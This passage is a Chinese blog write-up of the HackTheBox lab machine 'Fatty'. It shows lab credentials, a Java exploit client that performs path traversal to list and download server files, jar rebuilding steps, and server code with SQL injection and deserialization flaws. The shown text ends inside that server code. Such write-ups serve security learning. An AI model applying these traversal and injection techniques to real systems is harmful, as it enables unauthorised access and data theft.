        <content type="html"><![CDATA[<p> Faaty 是htb这周刚退役的靶机。本来一周前自己打算下手试试的,不过做了一会发现因为即将退役就干脆搁置等ippsec出视频自己再做233. 不过整体来说这台靶机真的非常有趣。并且涉及到大量的java知识。在这一次实际操作中自己才真正体会到前段时间巩固java开发的基础知识有多么重要。因此这里记录下具体操作的流程,将学到的新知识巩固一下。</p><a id="more"></a><p> 当然。这次实际操作途中还是有一处困扰着我的地方没有找到好的答案。就是idea中能否重新导入单个java文件并修改引入jar包中class的内容。</p><p> <img src="/2020/08/10/hackthebox-Fatty-JavaExploits/head.PNG" alt></p><ul><li>靶机ip: 10.10.10.174</li><li>攻击机: 10.10.14.25</li></ul><h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial-foothold to user"></a>initial-foothold to user</h2><p>首先nmap简单扫的结果只有21,22端口。21端口允许匿名登录。其中有4个文件。一个jar包与三个note</p><p>note.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. </span><br><span class="line">We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of doing it yourself ;)</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure><p>从这里我们可以看到。远程应该开放了1337,1338,1339端口来作为服务端。然后我们自己用jar包当客户端。</p><p>同时这里涉及到一个java thick client的概念。简单说就是数据处理有很大一部分由客户端完成。</p><p>note2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from.</span><br><span class="line">Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually.</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure><p>note2 提示我们使用java8.</p><p>note3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account:</span><br><span class="line">User: qtc Pass: clarabibi</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure><p>note3则直接提供给我们一组可行的账号。至此note已经看完。ftp服务上还剩下一个fatty-client.jar。我们下载下来进行审计</p><p>开始我是直接拿到本机的idea上看jar包的。首先结构上应该是spring框架编写功能+swing组件编写gui。但是并没有太大收获。比如常见如<code>readObject</code>这样的反序列化函数我并没有见到。但是却有<code>writeObject</code>存在。说明可能readObject这一操作是在服务端进行的。那么我们还是先尝试直接使用这个jar包。看看哪里有漏洞可寻。</p><p>首先注意,题目要求环境java8。所以kali可以很好的解决这个问题。我们直接使用<code>/usr/lib/jvm/java-8-openjdk-amd64/bin/java</code>调用jar包即可。</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/0.PNG" alt></p><p>从界面以及源码都能看出来这是一个用java swing组件写出来的gui界面。</p><p>首先尝试登录。但不出所料果然回显<code>Connection Error</code>。这点我们从jar包的beans.xml可以看出</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">                http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">                spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the</span></span><br><span class="line"><span class="comment"> constructor function. --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"connectionContext"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.ConnectionContext"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"0"</span> <span class="attr">value</span> = <span class="string">"server.fatty.htb"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"1"</span> <span class="attr">value</span> = <span class="string">"8000"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default</span></span><br><span class="line"><span class="comment">constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"trustedFatty"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.TrustedFatty"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"keystorePath"</span> <span class="attr">value</span> = <span class="string">"fatty.p12"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"secretHolder"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.SecretHolder"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"secret"</span> <span class="attr">value</span> = <span class="string">"clarabibiclarabibiclarabibi"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"connection"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.client.connection.Connection"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"0"</span> <span class="attr">ref</span> = <span class="string">"connectionContext"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"1"</span> <span class="attr">ref</span> = <span class="string">"trustedFatty"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"2"</span> <span class="attr">ref</span> = <span class="string">"secretHolder"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>bean的配置中存在server.fatty.htb 并配置端口8000.因此我们需要将这个hostname加入/etc/hosts.不过此处我们有两种方法。一种是直接更改jar包并重新使用。另一种是使用代理转发下流量。我因为偷懒选择了第二种。</p><p>即,在hosts 文件中设置为<code>127.0.0.1 server.fatty.htb</code>并使用socat转发本地8000的流量到10.10.10.147:1337上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:8000,fork TCP:10.10.10.174:1337</span><br></pre></td></tr></table></figure><p>当然。第一种方法也是可行的。但是实际非常麻烦。假如我们只是解压jar包，更改beans.xml再重新压缩位jar包的话<br><code>jar -uf fatty-client.jar beans.xml</code>。<br>再次运行将会发现出现java security problems。为什么呢？这是因为整个jar包中有部分配置文件会因为sha256变化的beans.xml出错,这跟java seal 的操作有关。一旦相关文件变化，将导致抛出Sealing Violation。所以我们必须删掉内容中记录了sha256值的文件并设定配置。</p><p>操作方法<br>METAINF/MANIFEST.MF 中底下所有sha256相关内容全部去掉，同时上面设置中<code>Sealed: True</code>这一行去掉。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0 </span><br><span class="line">Archiver-Version: Plexus Archiver </span><br><span class="line">Built-By: root </span><br><span class="line">Created-By: Apache Maven 3.3.9 </span><br><span class="line">Build-Jdk: 1.8.0_232 </span><br><span class="line">Main-Class: htb.fatty.client.run.Starter</span><br></pre></td></tr></table></figure><p>接着删掉META-INF/1.RSA META-INF/1.SF 两个同样含有sha256值的文件。重新更新jar包文件即可。(或者直接zip打包)</p><p>当然。虽然我开始没有进行这步操作,后面还是一样要做的。</p><p>然后现在我们可以跟服务进行交互了。<br>使用直接note中<code>qtc:clarabibi</code>成功登录后。试了一下几个操作发现还是没有什么收获。我们所在的用户组有ping,whoami,configs这样几个操作。其中configs执行的似乎是服务端列目录的工作。gui底下有一个按钮open,可以输入对应文件名读取服务端目录的文件。尝试open功能时fuzz触发了报错<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/1.PNG" alt></p><p>似乎<code>..</code>这样的操作可以进行一,两层路径穿越。但是并不能达成任意列目录。因为它过滤了<code>../..</code>。</p><p>看了下源码。列目录对应的应该是这里<br>Invoker中的showfiles</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">showFiles</span><span class="params">(String folder)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">    String methodName = (<span class="keyword">new</span> Object() &#123;</span><br><span class="line">    &#125;).getClass().getEnclosingMethod().getName();</span><br><span class="line">    logger.logInfo(<span class="string">"[+] Method '"</span> + methodName + <span class="string">"' was called by user '"</span> + <span class="keyword">this</span>.user.getUsername() + <span class="string">"'."</span>);</span><br><span class="line">    <span class="keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="keyword">this</span>.user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error: Method '"</span> + methodName + <span class="string">"' is not allowed for this user account"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"files"</span>);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(folder);</span><br><span class="line">        <span class="keyword">this</span>.sendAndRecv();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.response.hasError() ? <span class="string">"Error: Your action caused an error on the application server!"</span> : <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们gui中对应configs的操作是</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/2.PNG" alt><br>可见。此处原本设定了目录为configs.但倘若我们修改其为<code>..</code>是否就能路径穿越了呢？不妨一试。<br>参照ippsec视频,这里我们为了方便节省手动操作时间,而不是反复修改源码重新build jar包(然而打脸了,后面重新build了两次……)不如直接导入jar包并编写exp.</p><p>于是这里我去下了一个linux 上的idea.不得不吐槽配置ide环境居然也出了小问题 =&gt;  idea无法自动识别<code>/usr/lib/jvm</code>中的jdk.必须执行<code>sudo apt-get install openjdk-8-jdk</code>后。idea才能自动识别jvm中的java8.</p><p>我们创建一个环境为java8的工程。并在library中导入fatty-client.jar。</p><p>按照ippsec的思路简单写一个利用exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> htb.fatty.client.connection.Connection;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.client.methods.Invoker;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageBuildException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageParseException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.resources.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = Connection.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] connection failed"</span>+e.getMessage());</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[+] Successfully connected"</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">"qtc"</span>,<span class="string">"clarabibi"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn.login(user))&#123;</span><br><span class="line">            System.out.println(<span class="string">"[+] Successfully logged in"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] Login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String rolename=conn.getRoleName();</span><br><span class="line">        user.setRoleByName(rolename);</span><br><span class="line">        System.out.println(<span class="string">"[+] rolename is: "</span>+rolename);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Invoker invoker =new Invoker(conn,user);</span></span><br><span class="line"><span class="comment">        String response="";</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            response=invoker.showFiles("..");</span></span><br><span class="line"><span class="comment">        &#125; catch (MessageParseException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125; catch (MessageBuildException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        System.out.println("Server response:\n"+ response);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/3.PNG" alt></p><p>这样我们就能通过java代码来跟服务端交互了。同时比较方便的是。我们可以直接修改传入的值来节省时间<br>比如上面代码注释的部分即是invoker调用showFiles方法并获取回显。并且我们直接就可以修改传入的参数为<code>..</code>进行路径穿越.得到以下文件。<br>(try catch 直接用idea快捷键添加即可。非常方便)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Server response:</span><br><span class="line">logs</span><br><span class="line">tar</span><br><span class="line">start.sh</span><br><span class="line">fatty-server.jar</span><br><span class="line">files</span><br></pre></td></tr></table></figure><p>接下来使用open方法读文件。我们把invoker调用的方法改为<code>open(&quot;..&quot;,&quot;start.sh&quot;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unfortunately alpine docker containers seems to have problems with services.</span></span><br><span class="line"><span class="comment"># I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, </span></span><br><span class="line"><span class="comment"># both services are now started as part of the docker startup script.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start cron service</span></span><br><span class="line">crond -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start ssh server</span></span><br><span class="line">/usr/sbin/sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start Java application server</span></span><br><span class="line">su - qtc /bin/sh -c <span class="string">"java -jar /opt/fatty/fatty-server.jar"</span></span><br></pre></td></tr></table></figure><p>看来服务端运行的就是fatty-server.jar了.为了搞清楚服务端究竟做了什么操作。比如为什么我们用户组user权限有些方法调用不了,要怎么变为admin权限。服务端是否又调用了readObject呢？这些都需要对server的源码审计。</p><p>然而问题在于。我们并没有办法利用现有的方法获取服务jar包的完整数据。因为open方法调用的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">    response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即使不知道服务端是怎么读文件的。但是我们知道回显的内容是对this.respoonse调用<code>getContentAsString()</code>来将内容转为字符串。那么读取jar包这种二进制文件时必然会有不可见字符被直接忽视。导致我们获取的文件不完整。那么必须重写open方法。让它能直接将response内容写进本机。</p><p>然后这里就是比较头疼的一处了。我知道eclipse可以直接import 现有一个java文件作依赖然后重写调用(前提是执行了前面的unseal过程。即删除了rsa,sf,修改了mf)。但是idea我一直没找到好的调用方法。希望有大佬能教教我idea怎么处理最优…..</p><p>总之最后。我选择了直接重写代码再build jar包的方法。虽然有点蠢但是至少可行。首先我们直接获取文件内容并写入。因此在open方法中加入以下代码。<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/4.PNG" alt></p><p>当然直接新创建一个方法写文件并在exp中使用invoker调用也是可以的。</p><p>然后就是这次学到的命令行下重新build一个jar包的完整流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</span><br><span class="line">mkdir raw </span><br><span class="line">cp fatty-client.jar raw/fatty-client.jar </span><br><span class="line"><span class="built_in">cd</span> raw &amp;&amp; unzip fatty-client.jar</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">mv htb/fatty/client/methods/*.class raw/htb/fatty/client/methods/</span><br><span class="line"><span class="built_in">cd</span> raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF fatty.jar .</span><br></pre></td></tr></table></figure><p>比较闹心的是。因为之前用idea自动反编译的内容,导致源码的java文件找不到。我还得重新反编译一下jar包……然后修改Invoker.java。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">open</span><span class="params">(String foldername, String filename)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">    String methodName = (<span class="keyword">new</span> Object() &#123;</span><br><span class="line">    &#125;).getClass().getEnclosingMethod().getName();</span><br><span class="line">    logger.logInfo(<span class="string">"[+] Method '"</span> + methodName + <span class="string">"' was called by user '"</span> + <span class="keyword">this</span>.user.getUsername() + <span class="string">"'."</span>);</span><br><span class="line">    <span class="keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="keyword">this</span>.user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error: Method '"</span> + methodName + <span class="string">"' is not allowed for this user account"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"open"</span>);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(foldername);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(filename);</span><br><span class="line">        <span class="keyword">this</span>.sendAndRecv();</span><br><span class="line">        FileOutputStream  fos;</span><br><span class="line">        fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/fatty-server.jar"</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.response.hasError()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Error: Your action caused an error on the application server!"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String response = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fos.write(<span class="keyword">this</span>.response.getContent());    </span><br><span class="line">            fos.close(); </span><br><span class="line">            <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>然后就是<code>javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</code>.我们会发现<code>htb/fatty/client/methods/</code>下编译好了十几个class。接下来就是解包jar包。转移class文件并重新打包jar的事情了。</p><p>idea中导入我们重新改好的jar包。再次执行即可发现能够正常下载了。</p><p>下载好30分钟后我们得到了fatty-server.jar。再次审计server源码<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/5.PNG" alt></p><p>这一次很快就能在之前不确定的changePW处看到<code>readObject()</code>方法调用了。也就是说肯定存在反序列化漏洞。<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/6.PNG" alt><br>但是注意。把整个源码过一遍后会发现changePW方法对应的methodID 7需要adminrole才能执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getAdminRole</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"admin"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getUserRole</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"user"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getAnonymous</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"anonymous"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们必须找到一个能成为admin role的方法。回到登录那里的方法去审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">checkLogin</span><span class="params">(User user)</span> <span class="keyword">throws</span> FattyDbSession.LoginException </span>&#123;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">    User newUser = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stmt = <span class="keyword">this</span>.conn.createStatement();</span><br><span class="line">        rs = stmt.executeQuery(<span class="string">"SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000L</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException var10) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">            <span class="keyword">int</span> id = rs.getInt(<span 